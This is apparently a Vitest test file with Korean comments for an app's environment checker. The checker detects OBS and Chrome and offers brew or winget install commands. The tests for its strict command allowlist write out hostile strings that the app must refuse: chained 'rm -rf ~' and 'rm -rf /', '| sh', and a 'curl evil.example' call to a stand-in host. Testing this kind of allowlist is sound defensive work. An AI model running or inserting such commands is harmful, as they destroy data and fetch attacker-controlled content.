/**
 * 환경 점검.
 *
 * 특히 **설치 명령 흰 목록**이 중요하다 — 이 앱은 LAN 에도 열린다. 화면이 보낸
 * 문자열을 그대로 실행하면 '무엇이든 실행하는 구멍' 이 된다.
 */

import { describe, expect, it } from 'vitest';

import { checkEnv, ENV_ITEMS, isAllowedCommand, platformOf } from '../../lib/env-check.ts';

const nothing = (): boolean => false;
const everything = (): boolean => true;

describe('이 PC 가 무엇인가', () => {
  it('node 의 이름을 우리 말로 바꾼다', () => {
    expect(platformOf('darwin')).toBe('mac');
    expect(platformOf('win32')).toBe('win');
    expect(platformOf('linux')).toBe('other');
  });
});

describe('점검', () => {
  it('파일이 있으면 설치된 것으로 본다', () => {
    const found = checkEnv('mac', (p) => p === '/Applications/OBS.app', nothing);
    expect(found.find((one) => one.id === 'obs')!.installed).toBe(true);
  });

  it('없으면 설치 안 된 것으로 본다', () => {
    const found = checkEnv('mac', nothing, nothing);
    expect(found.find((one) => one.id === 'obs')!.installed).toBe(false);
  });

  /** 설치 도구가 없으면 명령을 주지 않는다 — 없는 명령을 권하면 눌러도 실패한다 */
  it('설치 도구가 없으면 명령을 주지 않는다', () => {
    const found = checkEnv('mac', nothing, nothing);
    expect(found.find((one) => one.id === 'obs')!.command).toBeUndefined();
    // 대신 공식 페이지는 늘 있다
    expect(found.find((one) => one.id === 'obs')!.homepage).toContain('obsproject.com');
  });

  it('설치 도구가 있으면 명령을 준다', () => {
    const found = checkEnv('mac', nothing, (tool) => tool === 'brew');
    const obs = found.find((one) => one.id === 'obs')!;
    expect(obs.tool).toBe('brew');
    expect(obs.command).toBe('brew install --cask obs');
  });

  /** 이미 있는 것에 설치 명령을 붙이면 눌러서 두 번 설치하게 된다 */
  it('이미 설치됐으면 명령을 주지 않는다', () => {
    const found = checkEnv('mac', everything, everything);
    expect(found.every((one) => one.command === undefined)).toBe(true);
  });

  /** 리눅스 등 — 경로도 명령도 없다. 그래도 무너지지 않고 목록은 나와야 한다 */
  it('모르는 플랫폼에서도 목록은 나온다', () => {
    const found = checkEnv('other', nothing, everything);
    expect(found).toHaveLength(ENV_ITEMS.length);
    expect(found.every((one) => one.command === undefined)).toBe(true);
  });

  it('없어도 되는 것과 꼭 필요한 것을 구분한다', () => {
    const found = checkEnv('mac', nothing, nothing);
    expect(found.find((one) => one.id === 'obs')!.optional).toBe(false);
    expect(found.find((one) => one.id === 'chrome')!.optional).toBe(true);
  });
});

/**
 * **이것이 이 파일에서 가장 중요한 검사다.**
 *
 * 목록에 적힌 명령과 글자까지 같을 때만 실행한다. 조금이라도 다르면 거절해야
 * 한다 — 뒤에 무엇을 이어 붙이든 통과하면 안 된다.
 */
describe('설치 명령 흰 목록', () => {
  it('목록에 있는 명령은 통과한다', () => {
    expect(isAllowedCommand('brew install --cask obs')).toBe(true);
    expect(isAllowedCommand('winget install --id OBSProject.OBSStudio -e')).toBe(true);
  });

  it('뒤에 무엇을 붙여도 거절한다', () => {
    expect(isAllowedCommand('brew install --cask obs; rm -rf ~')).toBe(false);
    expect(isAllowedCommand('brew install --cask obs && curl evil.example')).toBe(false);
    expect(isAllowedCommand('brew install --cask obs | sh')).toBe(false);
    expect(isAllowedCommand('brew install --cask obs\nrm -rf ~')).toBe(false);
  });

  it('다른 꾸러미를 넣으려 해도 거절한다', () => {
    expect(isAllowedCommand('brew install --cask 아무거나')).toBe(false);
    expect(isAllowedCommand('brew install obs')).toBe(false);
  });

  it('아예 다른 명령은 거절한다', () => {
    expect(isAllowedCommand('rm -rf /')).toBe(false);
    expect(isAllowedCommand('')).toBe(false);
    expect(isAllowedCommand('sh')).toBe(false);
  });

  /** 목록에 적은 명령은 전부 통과해야 한다 — 하나라도 막히면 그 단추가 죽는다 */
  it('목록의 모든 명령이 통과한다', () => {
    for (const item of ENV_ITEMS) {
      for (const install of Object.values(item.install)) {
        expect(isAllowedCommand(install.command), install.command).toBe(true);
      }
    }
  });
});
